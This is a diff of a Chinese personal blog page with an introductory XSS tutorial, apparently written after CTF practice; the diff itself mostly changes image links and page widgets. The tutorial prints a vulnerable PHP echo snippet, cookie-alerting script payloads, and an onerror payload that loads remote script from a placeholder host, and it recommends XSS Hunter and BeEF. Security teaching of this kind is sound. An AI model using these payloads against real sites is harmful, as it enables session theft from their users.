@@ -107,15 +107,15 @@
 <meta property="og:site_name" content="Kiona">
 <meta property="og:description" content="这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190408224857981.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190408230621970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190408232819504.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/201904082331521.png">
-<meta property="og:updated_time" content="2019-04-09T04:11:45.410Z">
+<meta property="og:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0001.png">
+<meta property="og:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0002.png">
+<meta property="og:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0003.png">
+<meta property="og:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0004.png">
+<meta property="og:updated_time" content="2019-04-15T06:07:45.346Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="什么是 XSS">
 <meta name="twitter:description" content="这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190408224857981.png">
+<meta name="twitter:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0001.png">
 
 
   <script>
@@ -422,17 +422,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;name&apos;]))&#123; </span><br><span class="line">        $text=$_GET[&apos;name&apos;];</span><br><span class="line">        echo &quot;&lt;div&gt;&quot;.$text.&quot;&lt;/div&gt;&quot; ; </span><br><span class="line">&#125; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/a.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190408224857981.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/04/08/什么是XSS/Image0001.png" alt></p>
 <p>代码被执行了，用户cookies被打印出来。<br><a id="more"></a><br><strong>第二种：存储型 XSS</strong></p>
 <p>存储型 XSS 会把用户输入的数据“存储”在远端服务器。这种 XSS 具有很强的稳定性。<br>上边的例子中可以看出用户点击恶意链接之后弹出cookies对话框，但是远端的黑客并不知道。如果编写一段代码可以把获取的cookies发送到黑客的服务器或者邮箱上，就可以窃取用户cookies了。但是这种代码比较庞大不适合写成临时文件，如放在URL中会使得URL过长可能导致意想不到的错误，因此需要把代码事先写好，存在服务器上通过各种方式在客户端运行此代码。这种代码称为 XSS Payload。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://www.a.com/xss&apos;;&gt;</span><br></pre></td></tr></table></figure>
-<p>这段代码会生成一个实际并不存在的图片，图片地址里面包含了恶意代码的地址，这样代码便被浏览器执行了，客户信息将被事先编写的js获取并告知黑客。<br>现如今互联网上遍布着各种公开的XSS Payload 模块，XSS 测试平台也很多，不想自己搭建的话可以直接使用，各平台大部分都是从GitHub上clone的大同小异，可以在项目管理界面实时查看成果。<br><img src="https://img-blog.csdnimg.cn/20190408230621970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>推荐一下国外的XSS Hunter ，这个平台可以把结果发送到你的邮箱，并且支持的注入方式很多，攻击模块也比较齐全，坏处就是国内访问延迟有点大，全英文会坑新人。有兴趣的话还是自己用kali搭个BeEF吧，谁用谁知道。</p>
+<p>这段代码会生成一个实际并不存在的图片，图片地址里面包含了恶意代码的地址，这样代码便被浏览器执行了，客户信息将被事先编写的js获取并告知黑客。<br>现如今互联网上遍布着各种公开的XSS Payload 模块，XSS 测试平台也很多，不想自己搭建的话可以直接使用，各平台大部分都是从GitHub上clone的大同小异，可以在项目管理界面实时查看成果。<br><img src="/2019/04/08/什么是XSS/Image0002.png" alt><br>推荐一下国外的XSS Hunter ，这个平台可以把结果发送到你的邮箱，并且支持的注入方式很多，攻击模块也比较齐全，坏处就是国内访问延迟有点大，全英文会坑新人。有兴趣的话还是自己用kali搭个BeEF吧，谁用谁知道。</p>
 <p><strong>第三种：DOM Based XSS</strong></p>
 <p>实际上，这种类型的XSS并非按照“数据是否存储在服务器”来划分，DOM Based XSS 从效果上来说也是反射型XSS。只是因为其成因比较特殊，使用过修改页面的DOM节点来形成的XSS，称之为 DOM Based XSS。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function fun()&#123;</span><br><span class="line">	var str=document.getElementById(&quot;text&quot;).value;</span><br><span class="line">	var d=document.getElementById(&quot;t&quot;).innerHTML=&quot;&lt;a herf=&apos; &quot;+str+&quot; &apos;&gt;link&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;t&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot;  onclick=&quot;fun()&quot; /&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190408232819504.png" alt="在这里插入图片描述"><br>页面根据用户的输入生成一个链接，由于没有进行合法性检查，所以可以输入以下代码。</p>
+<p><img src="/2019/04/08/什么是XSS/Image0003.png" alt><br>页面根据用户的输入生成一个链接，由于没有进行合法性检查，所以可以输入以下代码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(document.cookie) //</span><br></pre></td></tr></table></figure>
-<p>点击链接用户信息被输出。<br><img src="https://img-blog.csdnimg.cn/201904082331521.png" alt="在这里插入图片描述"><br>这里用到了闭合的技巧会在下一篇博文中讲到。</p>
+<p>点击链接用户信息被输出。<br><img src="/2019/04/08/什么是XSS/Image0004.png" alt><br>这里用到了闭合的技巧会在下一篇博文中讲到。</p>
 <p>这是关于XSS的简单介绍，下篇中会结合题目说一些XSS攻击方式。</p>
 
       
@@ -454,6 +454,35 @@
 	<div>
       
         
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/04/08/什么是XSS/">什么是 XSS</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Kiona 的个人博客">Kiona</a></p>
+  <p><span>发布时间:</span>2019年04月08日 - 23:04</p>
+  <p><span>最后更新:</span>2019年04月15日 - 14:04</p>
+  <p><span>原始链接:</span><a href="/2019/04/08/什么是XSS/" title="什么是 XSS">https://kkkiona.github.io/2019/04/08/什么是XSS/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://kkkiona.github.io/2019/04/08/什么是XSS/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
       
 	</div>
 
@@ -474,8 +503,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/08/XSS随笔02/" rel="next" title="XSS 随笔 02">
-                <i class="fa fa-chevron-left"></i> XSS 随笔 02
+              <a href="/2019/04/08/SVG-图片验证码解码/" rel="next" title="SVG 图片验证码解码">
+                <i class="fa fa-chevron-left"></i> SVG 图片验证码解码
               </a>
             
           </div>
@@ -679,7 +708,7 @@
 <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
 <script>
 var message_Path = '/live2d/';//资源目录，如果目录不对请更改
-var talkAPI = "https://openapi.tuling123.com/openapi/api/v2";//如果有类似图灵机器人的聊天接口请填写接口路径
+var talkAPI = "http://openapi.tuling123.com/openapi/api/v2";//如果有类似图灵机器人的聊天接口请填写接口路径
 </script>
 <script type="text/javascript" src="live2d/js/live2d.js"></script>
 <script type="text/javascript" src="live2d/js/message.js"></script>
